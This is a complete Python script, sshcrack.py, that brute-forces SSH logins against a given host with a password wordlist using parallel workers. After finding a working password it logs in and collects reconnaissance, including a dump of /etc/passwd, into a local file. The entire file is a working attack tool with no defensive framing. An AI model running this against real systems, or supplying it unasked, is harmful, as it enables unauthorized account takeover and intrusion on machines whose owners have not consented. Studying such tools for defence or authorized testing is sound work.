#!venv/bin/python

import multiprocessing
import sys
import time
from pathlib import Path
from pexpect import pxssh


NUM_WORKERS_PER_CPU = 1


def connect(user, host, port, password):
    try:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, password, port=port)
    except pxssh.ExceptionPxssh as e:
        if e.args[0] == "password refused":
            return False, password
        else:
            raise
    else:
        ssh.logout()
        return True, password


def perform_recon(ssh):
    print("Performing recon...")
    cmds = ["uptime", "uname -a", "whoami",
            "groups", "ifconfig", "cat /etc/passwd"]
    results = []
    for cmd in cmds:
        ssh.sendline(cmd)
        ssh.prompt()
        r = ssh.before.decode("utf-8")
        results.append(r.strip("\r\n"))
    s = "\n\n".join(results)
    p = Path(__file__).parent / "recon.txt"
    p.write_text(s)


if __name__ == '__main__':
    try:
        word_arg = sys.argv[1]
        user_arg = sys.argv[2]
        host_arg = sys.argv[3]
        port_arg = sys.argv[4]
    except IndexError:
        print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
        sys.exit(1)

    word_pth = Path(__file__).parent / f"{word_arg}"
    if not word_pth.exists():
        print(f"Word list '{word_pth.name}' not found")
        sys.exit(1)

    pws = []
    with word_pth.open("r") as f:
        for pw in f.read().split("\n"):
            pws.append(pw)

    print(f"Loaded {len(pws)} passwords from '{word_pth.name}'")

    clock_start = time.time()
    pool = multiprocessing.Pool(multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU)

    results = []
    for pw in pws:
        args = (user_arg, host_arg, port_arg, pw)
        results.append(pool.apply_async(connect, args))

    i = 0
    for result in results:
        res, pw = result.get()
        i += 1
        if res:
            print(f"({i}/{len(pws)}) Password is '{pw}'")
            pool.terminate()
            break
        else:
            print(f"({i}/{len(pws)}) Password is not '{pw}'")

    clock_end = time.time()
    pool.close()

    td = clock_end - clock_start
    print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {i/td:.2f}pw/s.")

    ssh = pxssh.pxssh()
    ssh.force_password = True
    ssh.login(host_arg, user_arg, pw, port=port_arg)
    perform_recon(ssh)
    print("Logging out.")
    ssh.logout()
